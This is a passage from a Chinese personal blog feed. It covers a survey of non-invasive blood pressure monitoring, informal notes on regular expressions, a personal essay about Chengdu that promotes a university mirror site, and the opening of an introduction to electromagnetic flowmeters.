<p>无创血压监测主要包括柯氏音法、测振法、超声法、双袖带法、恒定袖带法、逐拍跟踪法、张力测定法、恒定容积法等，其中振动法由于其有较好的抗干扰能力,能比较可靠地判断血压、实现血压的自动检测，在无创血压监测中应用最广。张力测定法无法避免机体环境变化时发生的外力和内力不平衡引起的误差;容积法虽然较为成熟，却无法避免长时间测量时静脉充血的影响，存在难以长期保持局部的压力的巍峨提。基于这些原理的血压计主要有，其水银式血压计、电子血压计及基于容积振动法的血压检测装置等。水银式血压计无创血压测量的"金标准"，被业界广泛认可。然而，水银血压计的使用要求较高，对于非医学从业人员尤其是年长老人群体操作使用时存在着一定困难。目前市场有成熟的便携电子血压计，适合家庭中使用。电子血压计大都采用了示波法的原理。然而便携电子血压计检测上也存在缺陷，血压测量精度问题难以解决，通常只用于有高血压等疾病的患者家庭中使用。脉搏波传导时间(PTT)的检测法近年来发展较快，但由于影响因素多，个体差异性大，测量精度有待提高。容积法（振动法）是通过袖带加压中容积脉搏波的变化而确定血管内部压力的测量方法。该方法易于实现电子自动化数字化测量，且测量精度较高。但是，该方法只能直接检测出收缩压，舒张压需通过间接计算，误差较高，甚至可达10%。无创血压计的主要厂家有欧姆龙、爱安德、鱼跃等，主要产品有欧姆龙上臂式血压U12、鱼跃上臂式YE670A等型号，此外迈克大夫等各厂家还拥有不同的心血管监测的专利技术。近年来主要的突破主要是价格的压缩和便携性的提高，在监测准确度上依然不如有创的方法，大部分设备的原理也仍然是振荡法。</p>
<p>目前对于振荡法的改进主要有采用先进的、严格控制的线性放气过程的硬件设备的改进以及通过综合频谱分析、小波变换、神经网络和基于奇异值矩阵分解的新型曲线拟合算法等信号处理的方法来寻找压力波形的特征计算血压等生理参数。进一步提高测量准确度的方法包括采用操作较复杂的双袖带检测法以及针对不同人群（如区分年龄、性别、体重等个人特征）调整检测算法，调整参数。</p>
<h2 id="血压监测设备的优化改进">血压监测设备的优化改进</h2>
<p>近年来对于无创血压计的改进主要集中于对于监测算法的改进和成本的降低以及小型化便携化，无创血压监测最大的应用市场。针对生理信号的特征提出了许多不同的监测方法，如基于容积脉搏波振幅梯度的血压检测法。一些监测连续信号的仪器也推出了监测心房颤动等疾病的监测算法。小型化设备的进展也有不少，例如进军医疗领域的苹果公司的Apple Waltch，心率和血压监测已经通过美国食品药品监督管理局（FDA）的认证。老牌厂商欧姆龙也推出了一款名为HeartGuide的手表，具备监测血压心率和睡眠质量的功能，并且可以通过蓝牙连接。</p>
<p>目前的主流电子血压计采用的振动法主要经历了三个阶段的发展。第一代电子血压计（G1-NIBPM）采用固定加压和机械排气技术，加压方式和效果类似水银血压计的手动充气。由于机械式慢速排气阀存在明显压迫感和精度低、寿命短等缺点，已经很少被采用。第二代电子血压计（G2-NIBPM）采用智能加压和电子控制伺服技术，提高了舒适度和测量结果的稳定性。三、 第三代电子血压计（G3-NIBPM）采用加压同步测量技术，加压速度均匀，并在加压的过程中进行血压测量，提高了测量的速度。第二代电子血压计技术主要用于上臂式电子血压计；第三代电子血压计技术主要用于手腕式电子血压计。</p>
<p><img width=400 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic1.png" alt="picture"/></p>
<p>图1 腕式、臂式血压计和能监测血压的手表</p>
<p>近年来，连续监测技术的发展使得无创测量的方法在每个心动周期内完成血压的测量，使得无创方法在健康监测和重症监测领域应用成为可能。对于连续的实时监护设备，多采用脉搏波（PTT）时间检测法，能够避免张力测定法与容积补偿法装置复杂成本高、检测难度大的缺陷。该方法利用血压升高动脉管壁会扩张降低动脉弹性和顺应性导致脉搏波传递速度加快，通过脉搏波的速度变化反应动脉血管压力的变化。脉搏波时间检测法不需要加压套袖，方便舒适，随着监测算法的改进，误差已经可以在平稳的情况下达到4mmHg，但是在运动等外部干扰下的表现不好，仍旧有待解决。该方法的发展有望取代一部分有创方法，对病人进行连续的生理特征监测。</p>
<p>此外动脉张力法也较为常见，市场化较早，也比较成熟，测量精度较高，无需每次定标。但是该方法测量桡动脉部位的动脉压力时难以保持位置固定，容易受到干扰。一些自动跟随的设备，如Bahr的改进张力计，也提高了监测的准确度。 动脉容积钳制法经过Tanoru和Yamakoshi等人的改进后，成为了另一种逐渐成熟的方法。该方法是在手指基部或中部放置气压指套或者液体填充加压袋的测量盒，并同时调节指套压力，并采用红外方式监测脉搏波的变化。指套压力采用自动反馈系统，始终等于动脉压。但是由于该方法测量手指的压力时施加外部压力，长时间测量易引起静脉充血。由于测量部位的原因，准确度不如腕部和上臂的测量方法，但是指尖测量有望实现监护仪的微型化，检测部位和无创血糖的检测部位类似，便于和血氧血糖模块组成小型多生理信号检测设备。对于动脉张力法的主要改进包括，补偿器补偿心脏和指端的流体静力学压差，采用气动袖套等方法解决袖套和心脏不在同一水平位置等问题。此外，通过舒张压和收缩压的特征参数利用线性回归的方法得到血压值等算法的提出也在一定程度上提高了准确度。</p>
<p>目前有基于脉搏波的臂带式可穿戴设备和使用手机、蓝牙设备的便携监测。能够用于长时间血压的连续监测。考虑到大部分家庭用的电子血压计使用者都是年纪较大的人，针对老年人进行的易操作改进和安全性也在市场产品中不断涌现。目前，200元以下的电子血压计已经基本满足家用需求，测量的准确度和水银柱式血压计相差不大。</p>
<h2 id="参考文献">参考文献</h2>
<p>[1]Andreas Patzak,Yuri Mendoza,Heiko Gesche,Martin Konermann. Continuous blood pressure measurement using the pulse transit time: Comparison to intra-arterial measurement[J]. Blood Pressure,2015,24(4).</p>
<p>[2]株式会社爱安德. 血压计: 日本，201730034188.6 2[P]. 2017-07-28.</p>
]]></content>
      <categories>
        <category>荒废的老本行</category>
      </categories>
      <tags>
        <tag>测量</tag>
        <tag>传感器</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/regex/</url>
    <content><![CDATA[<p>头大 <span id="more"></span></p>
<h2 id="让正则表达式的可读性可维护性高一点">让正则表达式的可读性、可维护性高一点</h2>
<p>正则一般不是给人看的，可读性都比较差，比如下面这个匹配邮箱的正则 <span class="exturl" data-url="aHR0cHM6Ly9yZWdleDEwMS5jb20vbGlicmFyeS9sUDd2TDM=">https://regex101.com/library/lP7vL3<i class="fa fa-external-link-alt"></i></span> <!-- 
<pre class="line-numbers language-none"><code class="language-none">(?:(?:\r\n)?[\t])*(?:(?:(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*|(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*)*\&lt;(?:(?:\r\n)?[\t])*(?:@(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*(?:,@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*)*:(?:(?:\r\n)?[\t])*)?(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*\&gt;(?:(?:\r\n)?[\t])*)|(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*)*:(?:(?:\r\n)?[\t])*(?:(?:(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*|(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*)*\&lt;(?:(?:\r\n)?[\t])*(?:@(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*(?:,@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*)*:(?:(?:\r\n)?[\t])*)?(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*\&gt;(?:(?:\r\n)?[\t])*)(?:,\s*(?:(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*|(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*)*\&lt;(?:(?:\r\n)?[\t])*(?:@(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*(?:,@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*)*:(?:(?:\r\n)?[\t])*)?(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|&quot;(?:[^\&quot;\r\\]|\\.|(?:(?:\r\n)?[\t]))*&quot;(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\&quot;.\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?&#x3D;[\[&quot;()&lt;&gt;@,;:\\&quot;.\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*\&gt;(?:(?:\r\n)?[\t])*))*)?;\s*)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre> --&gt; 我反正看不懂，让我再改点什么我也改不动。别说这种，就是我看我自己以前写的正则，时间一长都看不懂了。</p>
<p>有一些写法，比如Verbose Mode, 写起来会可读性强一点。</p>
<h2 id="性能问题">性能问题</h2>
<p>大部分正则库的实现貌似用的都是有限自动机。</p>
<p>似乎Perl的很快，javascript的要慢很多。</p>
<p>贪婪匹配之类的东西写多了就会卡死。</p>
<p>特别在乎性能或许可以自己手写Parser</p>
<h2 id="用法">用法</h2>
<h3 id="防止过度匹配">防止过度匹配</h3>
<p>使用? 比如</p>
<pre class="line-numbers language-none"><code class="language-none">* 改为 *?

匹配\&lt;b\&gt;标签:

&lt;[Bb]&gt;.*?&lt;&#x2F;[Bb]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="单词边界">单词边界</h3>
<p>使用不匹配边界使用,比如 配单词cat 匹配字符串使用^元字符</p>
<h3 id="子表达式">子表达式</h3>
<p>使用(),例如</p>
<pre class="line-numbers language-regex" data-language="regex"><code class="language-regex"><span class="token group punctuation">(</span>&amp;nbsp;<span class="token group punctuation">)</span><span class="token quantifier number">&#123;2,&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>匹配两个非换行空格</p>
<h3 id="回溯引用">回溯引用</h3>
<p>使用\1, 匹配一对html标签:</p>
<pre><code>\&lt;H1&gt;\&lt;/H1&gt;使用
&lt;Hh([1-6])&gt;.*?&lt;/[Hh]\1&gt; 匹配</code></pre>
<p>替换中也会用到\1 使用python的re库可以完成一些替换</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> repl<span class="token punctuation">,</span> string<span class="token punctuation">,</span> count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里重新排版电话号码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re

phone <span class="token operator">=</span> <span class="token string">"123-456-7890"</span>

<span class="token comment"># 将电话号重新排版为(123) 456-7890</span>
num <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"(\d&#123;3&#125;)(-)(\d&#123;3&#125;)(-)(\d&#123;4&#125;)"</span><span class="token punctuation">,</span> <span class="token string">r"(\1) \3-\5"</span><span class="token punctuation">,</span> phone<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"phone-number: "</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果</p>
<pre class="line-numbers language-none"><code class="language-none">phone-number:  (123) 456-7891<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="前向查找">前向查找</h3>
<p>使用?=进行前向查找,?&lt;=向后查找</p>
<p>比如,从<code>https://zhangjk98.xyz/</code>中找出协议https:</p>
<pre class="line-numbers language-none"><code class="language-none">.+(?&#x3D;:)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="一些坑">一些坑</h2>
<ol type="1">
<li>很多支持正则表达式的地方差异很大，有的甚至不支持完整的正则表达式，比如linux命令中grep，只支持Basic RegEx，像<code>? + () |</code>这种元字符全都不支持，需要用<code>-e</code>或<code>-P</code>参数使用扩展的正则或直接用Perl正则。Vim里面的正则也自己搞了一套，跟别的不太一样</li>
<li>win下面的空格和换行和linux下面不一样</li>
<li>懒惰匹配基本大部分正则库都是向后的，双向的懒惰匹配并没法用，比如<code>&lt;p&gt;.*?主诉.*?&lt;/p&gt;</code>并不能找出包含主诉的段落，实际上会找出从第一个p到包含主诉那个段落结束</li>
</ol>
<h2 id="参考">参考</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ppaXNoYW5lZC9sZWFybi1yZWdleC9ibG9iL21hc3Rlci90cmFuc2xhdGlvbnMvUkVBRE1FLWNuLm1k">https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md<i class="fa fa-external-link-alt"></i></span> 一个简短教程</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9yZWdleDEwMS5jb20v">https://regex101.com/<i class="fa fa-external-link-alt"></i></span> 在线练习和测试网站</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9yZWdleHIuY29tLw==">https://regexr.com/<i class="fa fa-external-link-alt"></i></span> 另一个网站，感觉功能比上面那个强，但只支持javascript和php</li>
</ol>
<h2 id="其他">其他</h2>
<p>等待填坑</p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>regex</tag>
      </tags>
  </entry>
  <entry>
    <title>沙河夜市</title>
    <url>/f641/</url>
    <content><![CDATA[<p>这几天走过泥电沙河边上的建设路，早上晨光熹微，夜间车马喧嚣，仿佛回到了高二高三在一中上学的日子。 <span id="more"></span></p>
<p>晚上路过建设路，卖小吃的沿街店铺生意似乎很火爆。到底还是网红街，比清水河西门外一片濒临倒闭的冷清店铺红火多了，显不出一点稳中向好共克时艰的样子。然而我这几天却没看到多少麻雀在路边找吃的，可能是人实在太多不太敢来吧。沙河校内倒是有些珠颈斑鸠和白颊噪鹛在路边捡樟树果子吃。鸟没看到，不到一周的时间却见了三次老鼠行色匆匆，穿梭在摊位间，可能是要回家养四个龟 不喜欢辣的我路过建设路，没有胃口，每次大晚上的走过去居然一点也不饿。</p>
<p>今天实习回来的师姐请我们吃螺蛳粉，不习惯嗦粉并不知道哪里好吃。 听说建设路吃的自从炒作过度就不如以前了，我也不晓得，反正没有市井气息，像旅游区。</p>
<p>浮世繁华，与我无关。 16年涨了房价的成都不像是那首不知道怎么火的《成都》，倒像是《北京北京》,居长安大不易。 咖啡馆离广场有三个街区，仿佛霓虹灯到月亮的距离，哦，不对，成都看不到月亮。</p>
<p>晚上回到租的房子，八二信箱家属区，老房子刷了一层屎黄色的漆，那感觉，和当年我长大的物探小区刷了一层红色的漆一样难受。我果然还是喜欢老小区。</p>
<p>成都夜雨，点点滴滴到天明</p>
<p><strong><em>对了，泥电的镜像源要上了，不来试试吗</em></strong> <span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24=">电子科技大学开源镜像站<i class="fa fa-external-link-alt"></i></span> ~~202.115.22.207 ~~（需要校内IP） 电子科大镜像源自从凝聚的凉了以后终于要续上了</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ping</span> <span class="token number">202.115</span>.22.207

正在 Ping <span class="token number">202.115</span>.22.207 具有 <span class="token number">32</span> 字节的数据:
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>2ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">&lt;</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">&lt;</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>

<span class="token number">202.115</span>.22.207 的 Ping 统计信息:
    数据包: 已发送 <span class="token operator">=</span> <span class="token number">4</span>，已接收 <span class="token operator">=</span> <span class="token number">4</span>，丢失 <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0</span>% 丢失<span class="token punctuation">)</span>，
往返行程的估计时间<span class="token punctuation">(</span>以毫秒为单位<span class="token punctuation">)</span>:
    最短 <span class="token operator">=</span> 0ms，最长 <span class="token operator">=</span> 2ms，平均 <span class="token operator">=</span> 0ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mirrors.png" alt="Picture" style="zoom:80%;" /> <em>请忽略现在还妹有前端这个问题，据说已经在做了.jpg</em></p>
<p>更新，前端已经安排上了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mirrors1.png" alt="Picture" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
  </entry>
  <entry>
    <title>电磁流量计</title>
    <url>/8ca1/</url>
    <content><![CDATA[<p>电磁流量计是一种常用流速流量计，应用电磁感应原理， 根据导电流体通过外加磁场时感生的电动势来测量导电流体流量的一种仪器。电磁流量计适用于满管污水等强导电性液体流量测量，多用于工业污水检测等场合。 <span id="more"></span></p>
<h4 id="电磁流量计原理">电磁流量计原理</h4>
<p>常用流速流量计有测量导电液体的电磁流量计、采用超声波流量计时差法外夹式或者管段式超声波流量仪表、采用多普勒雷达测速原理或利用声波在流体中传播的多普勒效应的流速仪。</p>
<p>电磁流量计（Electromagnetic Flowmeters，简称EMF），是20世纪50~60年代随着电子技术的发展而迅速发展起来的流量测量仪表。 电磁流量计是应用电磁感应原理， 根据导电流体通过外加磁场时感生的电动势来测量导电流体流量的一种仪器。</p>
